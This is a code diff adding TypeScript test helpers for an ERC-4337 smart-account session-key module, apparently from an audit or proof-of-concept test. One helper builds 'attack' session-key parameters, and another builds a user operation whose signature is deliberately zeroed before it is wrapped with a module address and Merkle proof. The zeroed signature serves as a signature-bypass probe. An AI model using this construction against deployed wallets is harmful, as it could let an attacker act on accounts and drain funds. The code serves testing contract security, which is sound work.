@@ -157,3 +157,85 @@ export async function getERC20SessionKeyParams(
   return params 
 }
 
+
+export async function getAttackSessionKeyParams(
+    sessionKey: string,
+    interfaceAddress: string,
+    validSelector: string,
+    validUntil: number,
+    validAfter: number,
+    sessionValidationModuleAddress: string,
+) : Promise<SessionKeyParams> {
+
+    const sessionKeyData = hexConcat([
+        hexZeroPad(sessionKey, 20),
+        hexZeroPad(interfaceAddress, 20),
+        hexZeroPad(validSelector, 4),
+    ]);
+
+    const leafData = hexConcat([
+        hexZeroPad(ethers.utils.hexlify(validUntil),6),
+        hexZeroPad(ethers.utils.hexlify(validAfter),6),
+        hexZeroPad(sessionValidationModuleAddress,20),
+        sessionKeyData
+    ]);
+
+    const params : SessionKeyParams = {
+        sessionKeyData: sessionKeyData,
+        leafData: leafData
+    };
+    return params
+}
+
+export async function makeEcdsaSessionKeySignedUserOp_noSignature(
+    functionName: string,
+    functionParams: any,
+    userOpSender: string,
+    sessionKey: Signer,
+    entryPoint: EntryPoint,
+    sessionKeyManagerAddress: string,
+    validUntil: number,
+    validAfter: number,
+    sessionValidationModuleAddress: string,
+    sessionKeyParamsData: BytesLike,
+    merkleProof: any
+) : Promise<UserOperation> {
+    const SmartAccount = await ethers.getContractFactory("SmartAccount");
+
+    const txnDataAA1 = SmartAccount.interface.encodeFunctionData(
+        functionName,
+        functionParams
+    );
+
+    const userOp = await fillAndSign(
+        {
+            sender: userOpSender,
+            callData: txnDataAA1
+        },
+        sessionKey,
+        entryPoint,
+        'nonce'
+    );
+    userOp.signature = "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+
+    const paddedSig = defaultAbiCoder.encode(
+        //validUntil, validAfter, sessionVerificationModule address, validationData, merkleProof, signature
+        ["uint48", "uint48", "address", "bytes", "bytes32[]", "bytes"],
+        [
+            validUntil,
+            validAfter,
+            sessionValidationModuleAddress,
+            sessionKeyParamsData,
+            merkleProof,
+            userOp.signature
+        ]
+    );
+
+    const signatureWithModuleAddress = ethers.utils.defaultAbiCoder.encode(
+        ["bytes", "address"],
+        [paddedSig, sessionKeyManagerAddress]
+    );
+    userOp.signature = signatureWithModuleAddress;
+
+    return userOp;
+}
